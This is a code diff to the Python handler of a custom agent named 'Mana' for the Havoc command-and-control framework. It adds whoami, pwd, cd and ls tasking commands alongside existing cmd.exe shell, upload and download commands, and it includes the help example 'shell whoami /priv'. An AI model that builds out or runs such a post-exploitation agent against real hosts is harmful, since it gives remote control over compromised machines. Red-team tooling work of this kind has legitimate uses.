@@ -18,16 +18,96 @@ COMMAND_EXIT             = 0x155
 
 COMMAND_OUTPUT           = 0x200
 
+# Situational Awareness
+
+COMMAND_WHOAMI           = 0x300
+
+COMMAND_PWD              = 0x400
+COMMAND_CD               = 0x401
+COMMAND_LS               = 0x402
+
+
 
 # ====================
 # ===== Commands =====
 # ====================
 
+class CommandLs(Command):
+    CommandId   = COMMAND_LS
+    Name        = "ls"
+    Description = "list files in directory"
+    Help        = "Usage: ls [path]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam(
+            name="path", 
+            is_file_path=False, 
+            is_optional=True
+        )
+    ]
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_int( self.CommandId )
+        path = arguments.get('path', '')
+        Task.add_data(path)
+        return Task.buffer
+
+class CommandCd(Command):
+    CommandId   = COMMAND_CD
+    Name        = "cd"
+    Description = "change working directory"
+    Help        = "Usage: cd [path]"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam(
+            name="path", 
+            is_file_path=False, 
+            is_optional=False)
+        ]
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_int( self.CommandId )
+        path = arguments.get('path', '')
+        Task.add_data(path)
+        return Task.buffer
+
+class CommandPwd(Command):
+    CommandId   = COMMAND_PWD
+    Name        = "pwd"
+    Description = "Get current working directory"
+    Help        = "Usage: pwd"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_int( self.CommandId )
+        return Task.buffer
+
+class CommandWhoami(Command):
+    CommandId   = COMMAND_WHOAMI
+    Name        = "whoami"
+    Description = "executes whoami command"
+    Help        = "Usage: whoami"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_int( self.CommandId )
+        return Task.buffer
+
 class CommandShell(Command):
     CommandId = COMMAND_SHELL
     Name = "shell"
     Description = "executes commands using cmd.exe"
-    Help = ""
+    Help = "shell whoami /priv"
     NeedAdmin = False
     Params = [
         CommandParam(
@@ -108,6 +188,7 @@ class CommandExit( Command ):
     Params      = []
 
     def job_generate( self, arguments: dict ) -> bytes:
+        print("exiting process...")
         Task = Packer()
         Task.add_int( self.CommandId )
         return Task.buffer
@@ -117,7 +198,7 @@ class CommandExit( Command ):
 # ===== Configuration ==========
 # ==============================
 
-PROFILE_PATH = "<full path to your profile>"
+PROFILE_PATH = "<your profile>"
 CONFIG_OUTPUT = "./Include/Config.h"
 
 
@@ -321,6 +402,10 @@ class Mana(AgentType):
         CommandUpload(),
         CommandDownload(),
         CommandExit(),
+        CommandWhoami(),
+        CommandPwd(),
+        CommandCd(),
+        CommandLs(),
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
@@ -472,7 +557,7 @@ class Mana(AgentType):
                 print("[-] Is not agent register request")
 
         else:
-            print( f"[*] Something else: {Command}" )
+            #print( f"[*] Something else: {Command}" )
 
             AgentID = response[ "Agent" ][ "NameID" ]
 
@@ -514,6 +599,9 @@ class Mana(AgentType):
                 self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )
 
                 self.download_file( AgentID, FileName, len(FileContent), FileContent )
+            
+            elif Command == COMMAND_EXIT:
+                self.console_message( AgentID, "exiting process", "Info", "[!] Exiting process..." )
 
             else:
                 self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )
